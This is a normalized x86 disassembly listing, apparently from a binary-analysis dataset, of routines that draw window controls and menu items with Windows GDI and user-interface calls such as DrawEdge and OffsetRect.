mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_450300
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424270
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_452ffc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_423d70
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4249b8
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_424568
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_423aa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403234
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4249b8
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_452ffc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453b3b
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_4520c0
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_452ffc
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_453b54
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45445c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424614
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_424270
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_423aa4
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404414
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_424270
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424614
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_450010
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4249b8
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424268
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424270
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424270
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424614
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424268
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42ae20
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424244
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424614
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424614
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cdc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_453f9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_429dc4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_423aa4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_450010
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424270
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_452ffc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_423d70
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4249b8
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424798
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_450300
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4249b8
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_424568
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_423aa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403234
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_452ffc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454463
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_4520c0
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_424818
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_452ffc
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_4545b0
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_454f94
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_4545e0
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_45462c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_45480e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403430
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_4545e0
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_454f94
mov esi eax
mov eax edi
call sub_4545b0
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_404414
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
